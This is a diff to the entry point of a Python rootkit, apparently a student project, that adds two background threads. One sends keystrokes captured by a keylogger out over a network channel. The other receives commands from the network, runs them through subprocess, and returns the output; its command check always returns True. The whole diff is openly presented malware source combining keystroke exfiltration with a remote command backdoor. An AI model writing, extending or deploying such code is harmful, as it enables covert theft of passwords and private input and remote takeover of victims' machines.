@@ -1,6 +1,10 @@
-#/bin/python
+# /usr/bin/python3
 
 import keylogger.model as kl
+import network.network as net
+import subprocess
+import threading
+import time
 
 """
 The entry point to the rootkit will setup a series of covert channels for
@@ -18,6 +22,39 @@ __author__ = "Nathaniel Cotton"
 __email__ = "nec2887@rit.edu"
 
 
+class KeyChecker(threading.Thread):
+    __slots__ = ['keylogger']
+
+    def __init__(self, keylogger):
+        super().__init__()
+        self.keylogger = keylogger
+
+    def run(self):
+        while True:
+            if (self.keylogger.hasInfoToSend()):
+                info = self.keylogger.getInfo()
+                net.send(''.join(info))
+            time.sleep(0)
+
+
+class RecvChecker(threading.Thread):
+    def __init__(self):
+        super().__init__()
+
+    def run(self):
+        while True:
+            command = net.recv()
+            if (self.verifyCommand(command)):
+                try:
+                    sp = subprocess.getoutput(command)
+                    net.send(sp)
+                except Exception as e:
+                    pass
+
+    def verifyCommand(self, command):
+        return True
+
+
 def main():
     """
     Entry point into the application, that will setup the keylogger
@@ -26,7 +63,10 @@ def main():
     """
     keylogger = kl.getKeyLogger()
     keylogger.start()
-
+    keychecker = KeyChecker(keylogger)
+    keychecker.start()
+    recvChecker = RecvChecker()
+    recvChecker.start()
 
 
 if __name__ == '__main__':
